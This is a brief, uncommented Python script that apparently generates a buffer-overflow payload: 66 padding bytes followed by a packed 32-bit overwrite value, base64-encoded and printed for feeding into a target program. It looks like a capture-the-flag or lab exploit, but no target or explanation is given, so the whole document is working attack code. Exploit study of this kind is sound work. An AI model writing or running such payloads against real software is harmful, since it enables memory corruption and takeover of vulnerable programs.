
import sys
import struct
import base64

buf = b'wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww'
buf += struct.pack('<I', 599588353)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
